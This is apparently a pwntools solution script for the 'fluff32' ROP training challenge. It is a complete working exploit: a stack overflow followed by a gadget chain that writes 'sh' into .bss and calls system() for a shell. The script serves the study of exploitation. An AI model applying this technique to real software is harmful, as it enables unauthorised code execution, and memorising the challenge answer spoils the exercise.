#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./fluff32")
sh = process("./fluff32")

system_plt = elf.plt["system"]
bss_addr = 0x0804A040
pop_ebx = 0x080483e1
xchg_edx_ecx = 0x08048689		# xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
xor_edx_ebx = 0x0804867b		# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
xor_edx_edx = 0x08048671		# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
mov_ecx_edx = 0x08048692		# pop edi ; mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret

payload = ""
payload += "A"*44
payload += p32(pop_ebx)
payload += p32(bss_addr)
payload += p32(xor_edx_edx)
payload += "AAAA"
payload += p32(xor_edx_ebx)
payload += "AAAA"
payload += p32(xchg_edx_ecx)
payload += "AAAA"

payload += p32(pop_ebx)
payload += "sh\x00\x00"
payload += p32(xor_edx_edx)
payload += "AAAA"
payload += p32(xor_edx_ebx)
payload += "AAAA"
payload += p32(mov_ecx_edx)
payload += "AAAA"
payload += "AAAA"
payload += p32(0)

payload += p32(system_plt)
payload += "AAAA"
payload += p32(bss_addr)

sh.sendline(payload)
sh.interactive()